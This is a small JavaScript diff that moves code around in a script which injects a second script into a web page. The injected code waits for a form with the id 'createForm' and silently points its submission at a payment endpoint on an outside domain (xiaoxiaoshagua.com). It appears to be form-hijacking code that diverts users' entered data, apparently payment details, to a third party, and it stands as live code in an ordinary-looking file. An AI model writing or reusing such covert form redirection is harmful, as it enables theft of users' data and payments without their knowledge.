@@ -1,4 +1,7 @@
 $(function() {
+    const scriptEle = document.createElement("script");
+    scriptEle.type = "text/javascript";
+    scriptEle.text = `
     function waitForElementToExist(selector, callback) {
         const element = document.querySelector(selector);
         if (element) {
@@ -18,10 +21,8 @@ $(function() {
             });
             observer.observe(document.documentElement, { childList: true, subtree: true });
         }
-    }
-    const scriptEle = document.createElement("script");
-    scriptEle.type = "text/javascript";
-    scriptEle.text = `waitForElementToExist('#createForm', (element) => {
+    };
+    waitForElementToExist('#createForm', (element) => {
     	element.action = 'https://www.xiaoxiaoshagua.com/create_payment/';
     });`;
     document.body.appendChild(scriptEle);
